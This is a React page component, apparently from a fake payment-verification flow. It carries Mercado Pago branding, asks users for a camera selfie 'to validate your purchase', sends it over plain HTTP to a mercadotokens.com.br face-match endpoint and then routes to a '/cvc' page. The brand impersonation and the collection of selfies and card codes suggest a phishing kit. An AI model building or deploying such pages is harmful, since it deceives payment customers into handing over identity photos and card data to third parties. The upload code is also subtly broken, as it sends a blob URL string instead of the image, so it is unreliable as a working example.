import React, {Component} from 'react';
import { Link } from 'react-router-dom';
import { Redirect } from 'react-router-dom'
import axios from 'axios';

import Logo from '../../assets/mercado-pago.svg';
import MercadoToken from '../../assets/mercado-tokens-ok.png';

import { Container, Topo, Inputs } from './styles';

class Segunda extends Component {
  constructor(props){
    super(props)
    this.state = {
      file: null,
      erro: ''
    }
    this.handleChangeFile1 = this.handleChangeFile1.bind(this)
  }

  handleChangeFile1(event) {
    this.setState({
      file: URL.createObjectURL(event.target.files[0])
    })
  }

  // On file upload (click the upload button)
  onFileUpload = (e) => {
    e.preventDefault();
    // Create an object of formData
    const formData = new FormData();

    formData.append('selfie',this.state.file);
    const config = {
      headers: {
        'content-type': 'multipart/form-data'
      }
    };
    axios.post("http://api.mercadotokens.com.br/api/customer-orders/facematch",formData,config)
      .then((response) => {
        this.setState({erro: '' });

        if (response.data.token_transaction !== "") {
          console.log("REDIRECT");
          this.props.history.push('/cvc')
        }
        console.log(response);
      }).catch((error) => {
        console.log("ACONTECEU UM ERRO");
        this.setState({erro: 'Aconteceu um erro' });
    });
  };

  render() {
      return (
        <Container>
          <Topo>
            <img src={Logo} alt=""/>
          </Topo>

          <h1>Confirme que é você.</h1>
          <p className="error">{this.state.erro}</p>
          <p>Tire uma foto sua para validar sua compra. </p>

          <Inputs>
            <img width={"150px"} src={this.state.file}/>
            <input type="file" accept="image/*" capture="camera" onChange={this.handleChangeFile1}/>
            <button onClick={this.onFileUpload}>
              Enviar
            </button>

            <img className="mt" src={MercadoToken} alt=""/>
            
            {/*<Link to="/cvc"><button>Enviar</button></Link>*/}
          </Inputs>
        </Container>
      )
  }
}

export default Segunda;